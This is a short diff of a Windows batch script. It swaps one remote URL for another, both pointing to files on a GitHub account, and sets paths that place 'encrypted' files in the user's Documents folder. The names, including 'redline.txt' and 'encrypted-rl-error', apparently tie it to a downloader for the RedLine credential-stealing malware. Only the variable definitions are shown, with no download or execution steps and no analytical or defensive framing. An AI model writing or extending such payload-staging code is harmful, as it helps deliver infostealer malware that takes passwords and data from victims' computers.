@@ -87,7 +87,7 @@ endlocal
 
 
 :: Define URLs and paths
-set "encryptedRLUrl=https://raw.githubusercontent.com/spooffewfe/yff/refs/heads/main/encrypt.txt"
+set "encryptedRLUrl=https://raw.githubusercontent.com/spooffewfe/yff/refs/heads/main/rl.txt"
 set "encryptedBerlinUrl=https://raw.githubusercontent.com/spooffewfe/yff/refs/heads/main/redline.txt"
 set "docsDir=%USERPROFILE%\Documents"
 set "encryptedRLFile=%docsDir%\encrypted-rl-error.txt"
